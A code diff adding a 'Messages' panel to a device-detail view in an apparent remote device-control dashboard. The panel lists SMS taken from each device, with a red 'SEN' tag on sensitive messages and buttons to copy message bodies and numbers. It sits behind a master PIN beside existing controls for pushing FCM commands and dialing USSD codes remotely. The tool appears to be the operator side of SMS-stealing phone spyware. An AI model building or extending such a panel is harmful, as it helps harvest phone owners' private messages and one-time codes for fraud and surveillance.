@@ -726,6 +726,19 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
   const [ussdLog, setUssdLog] = useState("");
   const [ussdCode, setUssdCode] = useState("");
 
+  const [devMsgs, setDevMsgs] = useState<MsgRow[]>([]);
+  const [msgsLoading, setMsgsLoading] = useState(false);
+  const [expandedMsg, setExpandedMsg] = useState<number | null>(null);
+
+  useEffect(() => {
+    setMsgsLoading(true);
+    apiFetch(`/api/messages?appId=${encodeURIComponent(device.appId)}&deviceId=${encodeURIComponent(device.deviceId)}&limit=100`, { headers: { "x-master-pin": masterPin } })
+      .then(r => r.ok ? r.json() : [])
+      .then(data => setDevMsgs(data as MsgRow[]))
+      .catch(() => {})
+      .finally(() => setMsgsLoading(false));
+  }, [device.appId, device.deviceId, masterPin]);
+
   async function sendFcm(data: Record<string, string>, setState: (s: FcmState) => void, setLog: (l: string) => void) {
     if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
     setState("sending"); setLog("Sending…");
@@ -903,6 +916,83 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
               {ussdState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Hash /> Dial USSD</>}
             </BtnSend>
           </FcmActionCard>
+
+          {/* Messages Section */}
+          <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
+            <div style={{ padding: "12px 16px", borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                <div style={{ color: T.accentLight }}><Ic.MessageSquare /></div>
+                <span style={{ fontWeight: 800, fontSize: 14, color: T.text }}>Messages</span>
+                <span style={{ background: T.accentGlow, color: T.accentLight, borderRadius: 99, padding: "1px 8px", fontSize: 11, fontWeight: 700 }}>{devMsgs.length}</span>
+              </div>
+              <button onClick={() => {
+                setMsgsLoading(true);
+                apiFetch(`/api/messages?appId=${encodeURIComponent(device.appId)}&deviceId=${encodeURIComponent(device.deviceId)}&limit=100`, { headers: { "x-master-pin": masterPin } })
+                  .then(r => r.ok ? r.json() : []).then(d => setDevMsgs(d as MsgRow[])).catch(() => {}).finally(() => setMsgsLoading(false));
+              }} disabled={msgsLoading} style={{ background: "none", border: `1px solid ${T.borderLight}`, borderRadius: 7, padding: "5px 10px", color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", gap: 5 }}>
+                {msgsLoading ? <Spinner /> : <Ic.Refresh />} Refresh
+              </button>
+            </div>
+            <div style={{ padding: 12, display: "flex", flexDirection: "column", gap: 6, maxHeight: 420, overflowY: "auto" }}>
+              {msgsLoading && devMsgs.length === 0 ? (
+                <div style={{ textAlign: "center", padding: 32, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 8 }}><Spinner /><span style={{ fontSize: 12 }}>Loading messages…</span></div>
+              ) : devMsgs.length === 0 ? (
+                <div style={{ textAlign: "center", padding: 32, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 8 }}>
+                  <Ic.Inbox /><span style={{ fontSize: 12 }}>No messages for this device.</span>
+                </div>
+              ) : devMsgs.map(msg => {
+                const isExp = expandedMsg === msg.id;
+                return (
+                  <div key={msg.id} onClick={() => setExpandedMsg(isExp ? null : msg.id)}
+                    style={{ background: T.inputBg, borderRadius: 10, border: `1px solid ${msg.isSensitive ? T.red + "33" : T.borderLight}`, overflow: "hidden", cursor: "pointer" }}>
+                    <div style={{ padding: "9px 12px", display: "flex", alignItems: "center", gap: 9 }}>
+                      {msg.isSensitive && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px", flexShrink: 0 }}>SEN</span>}
+                      <div style={{ flex: 1, minWidth: 0 }}>
+                        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 2 }}>
+                          <span style={{ fontWeight: 800, fontSize: 13, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{msg.fromSender || msg.fromNumber}</span>
+                          {msg.fromSender && msg.fromNumber !== msg.fromSender && <span style={{ fontSize: 11, color: T.accentLight, fontFamily: "monospace", flexShrink: 0 }}>{msg.fromNumber}</span>}
+                        </div>
+                        <div style={{ fontSize: 12, color: T.muted, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{msg.body}</div>
+                      </div>
+                      <div style={{ fontSize: 10, color: T.muted, flexShrink: 0 }}>{fmtAgo(msg.receivedAt)}</div>
+                      <div style={{ color: T.muted, flexShrink: 0, transition: "transform 0.15s", transform: isExp ? "rotate(90deg)" : "none" }}><Ic.ChevronRight /></div>
+                    </div>
+                    {isExp && (
+                      <div style={{ padding: "0 12px 12px", borderTop: `1px solid ${T.borderLight}` }}>
+                        <div style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 8 }}>
+                          <div style={{ background: T.card, borderRadius: 9, padding: 12 }}>
+                            <div style={{ fontSize: 10, color: T.muted, fontWeight: 700, marginBottom: 4, textTransform: "uppercase", letterSpacing: 0.8 }}>Message</div>
+                            <div style={{ fontSize: 14, color: T.text, lineHeight: 1.6, wordBreak: "break-word" }}>{msg.body}</div>
+                          </div>
+                          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 6 }}>
+                            {[
+                              { l: "From Number", v: msg.fromNumber },
+                              { l: "Sender", v: msg.fromSender },
+                              { l: "App ID", v: msg.appId },
+                              { l: "Device ID", v: msg.deviceId },
+                              { l: "User ID", v: msg.userId },
+                              { l: "Received", v: fmtDate(msg.receivedAt) },
+                            ].map(({ l, v }) => (
+                              <div key={l} style={{ background: T.card, borderRadius: 8, padding: "8px 10px" }}>
+                                <div style={{ fontSize: 9, color: T.muted, fontWeight: 700, textTransform: "uppercase", marginBottom: 2 }}>{l}</div>
+                                <div style={{ fontSize: 11, color: T.mutedLight, fontFamily: "monospace", wordBreak: "break-all" }}>{v ?? "—"}</div>
+                              </div>
+                            ))}
+                          </div>
+                          <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
+                            <CopyBtn value={msg.body} label="Message" />
+                            <CopyBtn value={msg.fromNumber} label="Number" />
+                            <CopyBtn value={msg.deviceId} label="Device ID" />
+                          </div>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                );
+              })}
+            </div>
+          </div>
+
         </div>
       </div>
     </div>
